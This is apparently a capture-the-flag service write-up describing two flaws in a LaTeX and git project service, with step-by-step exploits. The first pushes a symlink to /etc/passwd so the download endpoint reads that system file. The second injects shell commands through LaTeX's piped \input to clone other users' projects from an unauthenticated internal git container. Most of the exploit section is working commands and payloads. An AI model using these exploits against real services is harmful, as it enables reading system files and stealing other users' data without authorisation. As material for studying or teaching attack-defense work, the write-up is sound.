# Vulnerabilities

## Arbitrary Read

- Category: Path traversal
- Difficulty: Medium
  It is possible to upload a symlink to a file via git. The endpoint `/api/files/download/:id/*` will follow this symlink read the file.

## Authentication Bypass

- Category: Authentication
- Difficulty: Medium

# Exploits

## Arbitrary Read

- Create an account
- Create a project
- Clone the project to your local machine:

```bash
$ git clone http://127.0.0.1:8080/git/d475a0513dcd1e5b3c7239420a58729d9b49360c2c5c277bc9eb1c0d7dacc954
Cloning into 'd475a0513dcd1e5b3c7239420a58729d9b49360c2c5c277bc9eb1c0d7dacc954'...
Username for 'http://127.0.0.1:8080': a
Password for 'http://a@127.0.0.1:8080':
remote: Enumerating objects: 3, done.
remote: Counting objects: 100% (3/3), done.
remote: Compressing objects: 100% (2/2), done.
remote: Total 3 (delta 0), reused 0 (delta 0)
Unpacking objects: 100% (3/3), 334 bytes | 334.00 KiB/s, done.
$ cd d475a0513dcd1e5b3c7239420a58729d9b49360c2c5c277bc9eb1c0d7dacc954/
$ ls -la
total 16
drwxrwxr-x  3 hllm hllm 4096 Jun  1 21:06 .
drwxrwxrwt 23 root root 4096 Jun  1 21:06 ..
drwxrwxr-x  8 hllm hllm 4096 Jun  1 21:06 .git
-rw-rw-r--  1 hllm hllm  216 Jun  1 21:06 main.tex
```

- Create a symlink and push it to the repo

```bash
$ ln -s /etc/passwd link
$ git add . && git commit -m "Added symlink to /etc/passwd"
$ git push
```

- Pull the changes by clicking on `Pull` in the project view
- Open the `link` now present in the file list

## Authentication Bypass

LaTeX can be used to run code[¹](https://0day.work/hacking-with-latex/), this is a feature of this service, however, this also allows acces to the `nginx-git` container.
This container itself dose not check for any authentication when cloning.

- Create a project
- Upload a file containing

```tex
\documentclass[12pt]{minimal}
\usepackage{verbatim}
\begin{document}
    \input{|"echo XGJlZ2lue3ZlcmJhdGltfQ== | base64 --decode; git clone http://nginx-git/ID; cat ./ID/main.tex; echo XGVuZHt2ZXJiYXRpbX0= | base64 --decode"}
\end{document}
```

- Compile this file
- The resulting pdf will contain `main.tex` of the proeject with the corrosponding id
